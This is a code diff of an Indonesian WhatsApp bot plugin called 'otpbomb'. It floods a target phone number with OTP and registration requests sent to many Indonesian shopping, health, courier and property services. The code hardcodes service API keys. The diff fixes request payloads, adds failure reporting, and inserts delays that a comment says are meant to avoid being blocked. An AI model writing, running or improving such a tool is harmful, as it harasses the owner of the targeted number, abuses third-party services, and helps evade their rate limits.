@@ -1,18 +1,17 @@
-// Plugin adaptasi dari paket plugin Nakano-Miku-MD (GPL-3.0) yang dikirim pengguna.
-// Asal       : plugins/tools/tools-otpboom.js (paket plugin Drive)
-// Penyesuaian: handler.command jadi array, properti handler.* yang tidak didukung dibuang,
-//              kategori/deskripsi ditambahkan, branding base lama dibersihkan.
-// Command    : .otpbomb, .bombotp
-
 import axios from 'axios';
 
 const handler = async (m, { conn, text, usedPrefix, command }) => {
-  if (!text) return m.reply(`Gunakan: ${usedPrefix}${command} <nomor hp>`);
+  if (!text) return m.reply(`Gunakan: ${usedPrefix}${command} <nomor hp>\nContoh: ${usedPrefix}${command} 08123456789`);
 
   const phoneNumber = text.trim();
   let phone = phoneNumber.replace(/[^0-9]/g, "");
   if (phone.startsWith("0")) phone = "62" + phone.slice(1);
   if (!phone.startsWith("62")) phone = "62" + phone;
+
+  // Validasi panjang nomor Indonesia (62 + 9-12 digit)
+  if (phone.length < 11 || phone.length > 15) {
+    return m.reply("❌ Nomor HP tidak valid. Masukkan nomor Indonesia yang benar.");
+  }
 
   const p08 = "0" + phone.slice(2);
   const p62 = phone;
@@ -20,15 +19,15 @@ const handler = async (m, { conn, text, usedPrefix, command }) => {
   const msg = await m.reply('⏳ Sedang mengirim OTP...');
 
   const otp = [
-    { url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
+    { url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "62", mobileNumber: p08, activationCode: "000000" } },
     { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
     { url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: p62, name: "user", agreeTnc: true, agreeContact: false } },
-    { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
+    { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911-b189-4a5c-9d3e-000000000000" }, request_via: "whatsapp" } },
     { url: "https://api.dokterin.id/user/v1/users/login", data: { phone: p62, tnc_accept: true } },
     { url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p08 }, headers: { "X-ML-KEY": "D09ACCPN9" } },
     { url: "https://cms.bunda.co.id/api/v1/auth/send-otp", data: { phone_number: p62.replace("62", ""), country_code: "62", type: "auth" } },
     { url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: p08 } },
-    { url: `https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${p62}?sms=false`, method: "GET", headers: { "x-recaptcha": "acf49209:" } },
+    { url: `https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${p62}?sms=false`, method: "GET", headers: { "x-recaptcha": "acf49209" } },
     { url: "https://register.paper.id/api/v1/auth/register/send-otp", data: { phone: p62, method: "whatsapp", registered_by: "web" } },
     { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
     { url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: p62 } },
@@ -41,48 +40,56 @@ const handler = async (m, { conn, text, usedPrefix, command }) => {
 
   let success = 0;
   let failed = 0;
+  const failedList = [];
 
   for (const ep of otp) {
     try {
       const config = {
-        headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
-        timeout: 10000
+        headers: {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
+          ...(ep.headers || {})
+        },
+        timeout: 15000,
+        validateStatus: () => true // biar 4xx/5xx gak langsung throw, kita bisa cek status
       };
-      if (ep.method === "GET") {
-        await axios.get(ep.url, config);
+
+      const res = ep.method === "GET"
+        ? await axios.get(ep.url, config)
+        : await axios.post(ep.url, ep.data, config);
+
+      if (res.status >= 200 && res.status < 300) {
+        success++;
       } else {
-        await axios.post(ep.url, ep.data, config);
+        failed++;
+        failedList.push(`${new URL(ep.url).hostname} (${res.status})`);
       }
-      success++;
-    } catch {
+    } catch (e) {
       failed++;
+      failedList.push(`${new URL(ep.url).hostname} (${e.code || "ERR"})`);
     }
+
+    // delay 1.5 detik antar request biar gak keburu diblokir
+    await new Promise(r => setTimeout(r, 1500));
   }
 
-  const response = `— otp bomber —
+  const response = `— OTP REQUEST REPORT —
 
-❀ nomor hp :
-${phone}
+❀ Nomor HP     : ${phone}
+❀ Total Target : ${otp.length}
+❀ Berhasil     : ${success}
+❀ Gagal        : ${failed}
 
-❀ total request :
-${otp.length}
-
-❀ berhasil :
-${success}
-
-❀ gagal :
-${failed}
-
-✓ OTP telah dikirim ke nomor Anda`;
+${failedList.length ? `❀ Gagal di:\n${failedList.map(f => "  • " + f).join("\n")}` : "✓ Semua endpoint terkirim"}`;
 
   await conn.sendMessage(m.chat, { delete: msg.key });
   await conn.sendMessage(m.chat, { text: response }, { quoted: m });
 };
 
-handler.command = ['otpbomb', 'bombotp']
+handler.help = ['otpbomb'];
+handler.tags = ['tools'];
+handler.command = /^(otpbomb|bombotp)$/i;
 handler.premium = true;
+handler.register = true;
 
 export default handler;
-handler.category = 'Tools'
-handler.description = 'Tools-otpboom'
-
